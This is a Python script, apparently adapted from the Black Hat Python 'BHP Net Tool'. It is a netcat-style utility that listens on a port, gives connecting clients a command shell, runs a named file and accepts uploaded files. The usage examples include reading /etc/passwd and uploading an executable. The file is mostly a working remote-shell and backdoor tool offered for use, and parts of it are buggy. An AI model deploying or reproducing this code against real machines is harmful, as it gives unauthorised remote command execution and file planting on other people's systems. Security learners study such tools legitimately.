#!/usr/bin/python
import sys
import socket
import getopt
import threading
import subprocess
import os

# define some global variable
listen = False
command = False
upload = False
execute = ''
target = ''
upload_destination = ''
port = 0

def usage():
    print('BHP Net Tool')
    print()
    print('Usage: bhpnet.py -t target_host -p port')
    print('-l --listen               - listen on [host]:[port] for incoming connections')
    print('-e --execute=file_to_run  - execute the given file upon receiving the connection')
    print('-c --command              - initialize a command shell')
    print('-u --upload=destination   - upon receiving connection upload a file and write to [ destination ]')
    print()
    print('Examples: ')
    print('bhpnet.py 192.168.0.1 -p 5555 -l -c')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\'cat /etc/passwd\'')
    print('echo "ABCDEFGHI" | ./bhpnet.py -t 192.168.11.12 -p 135 ')
    sys.exit(0)

def client_sender(buffer):
    import socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to our target host
        client.connect((target,port))

        if len(buffer):
            client.send(buffer.encode('ascii'))
        
        while True:

            # now wait for the data back
            recv_len = 1
            response =''

            while recv_len:

                data = client.recv(4096)
                data = data.decode('ascii')
                recv_len = len(data)
                response += str(data)

                if recv_len < 1024:
                    break
            
            print(response)
            print()

            # wait for input
            buffer = input('')
            buffer += '\n'
            # send it off
            client.send(buffer.encode('ascii'))
            logfile = open('log.txt','a')
            logfile.write('YOU: ' + str(buffer))
            logfile.close()

    except Exception as err:
        print('[*] Exception! Exiting.')
        print(err)
        # tear down the connection
        client.close()

def run_command(command):
    global cmd_buffer
    from subprocess import Popen, PIPE
    cmd_buffer = cmd_buffer.rstrip()
    #print(cmd_buffer)
    #print(f'commandddddddd   type:  {type(cmd_buffer)} {cmd_buffer} ')
    global output
    # trim the newline
    # run the command and get the output back
    stdout = Popen(cmd_buffer,shell=True,stdout=PIPE).stdout
    output = stdout.read()
    print('output [--->]' + str(output))
    
    
    # send the output back to the client
    return output
    #client_socket.send(output)


def client_handler(client_socket):
    global upload
    global execute
    global command
    import os
    # check for upload
    if len(upload_destination):
        
        # read in all of the bytes and write to our destination 
        file_buffer = ''

        # keep reading data until none is available

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # now we take these bytes and try to write them out 
        try:
            file_descriptor = open(upload_destination,'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out 
            client_socket.send(b"Successfully saved file to %s\r\n" % upload_destination)

        except:
            client_socket.send(b'Failed to save the file to %s\r\n' % upload_destination)

    # check for command execution
    if len(execute):
        execute = str.encode(execute)
        # run the command
        output = run_command(execute)
        output = str.encode(output)
        client_socket.send(output)

    if command:
        global cmd_buffer
        while True:
            try:
            # show a simple prompt
                client_socket.send('<BHPppppp:#> '.encode('ascii'))

                cmd_buffer = ''
                while '\n' not in cmd_buffer:
                    command = client_socket.recv(1024)
                    command = command.decode('ascii')
                    command = str(command)
                    cmd_buffer += command
                    print(f'received: {cmd_buffer}')
                # send back the command output 
                output = run_command(cmd_buffer)
                #print('function run command')
                try:
                    if output == '':
                        client_socket.send('Command not Found'.encode('ascii'))


                    else:
                        client_socket.send(output)
                        print('output send ...')
                except Exception as err:
                    print('err:' + err)
            except:
                pass


def server_loop():
    global target

    # if target is not defined, we listen on all interfaces
    if not len(target):
        target = '0.0.0.0'
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        print(f'[*] Accepted Connection from {addr[0]}:{addr[1]}')

        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the commandLine options
    try:
        opts,args = getopt.getopt(sys.argv[1:],'hle:t:p:cu:',
                    ['help','listen','execute','target','port','command','upload'])
    
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ('-h','--help'):
            usage()
        elif o in ('-l','--listen'):
            listen = True
        elif o in ('-e','--execute'):
            execute = a
        elif o in ('-c','--commandshell'):
            command = True
        elif o in ('-u','--upload'):
            upload_destination = a 
        elif o in ('-t','--target'):
            target = a
        elif o in ('-p','--port'):
            port = int(a)
        else:
            assert False,'Unhandled Option'

    # are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:

        # read in the buffer from the commandline
        # this will block, so send CTRL_D if not sending input
        # to stdin
        buffer = sys.stdin.read()

        # send data off
        client_sender(buffer)
    
    # we are going to listen and potentially
    # upload things, execute commands, and drop a shell back
    if listen:
        server_loop()

main()
    

